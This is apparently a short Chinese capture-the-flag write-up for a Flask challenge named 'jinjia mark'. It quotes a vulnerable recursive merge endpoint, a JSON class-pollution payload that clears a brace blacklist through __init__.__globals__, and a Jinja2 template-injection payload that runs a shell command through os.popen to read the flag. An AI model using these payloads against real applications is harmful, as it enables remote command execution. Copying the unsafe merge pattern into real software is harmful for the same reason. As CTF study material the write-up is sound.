### jinjia mark

---

那个题给了，爆破也行

![image-20240927155555530](https://gitee.com/bx33661/image/raw/master/path/image-20240927155555530.png)

```python
BLACKLIST_IN_index = ['{','}']
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
@app.route('/magic',methods=['POST', 'GET'])
def pollute():
    if request.method == 'POST':
        if request.is_json:
            merge(json.loads(request.data), instance)
            return "这个魔术还行吧"
        else:
            return "我要json的魔术"
    return "记得用POST方法把魔术交上来"
```

看到这个`merge`函数就想到原型链、

我们看到它给的黑名单，现在用原型链给它污染了，就可以达到我们的目的



然后在`Magic` 路由传递

```json
{
    "__init__":{
        "__globals__":{
           "BLACKLIST_IN_index":""
        }
    }
}
```

然后返回`index`目录下

我们就可以进行ssti,拿到flag

```
{{lipsum.__globals__['os'].popen('tac ../flag').read()}}
```



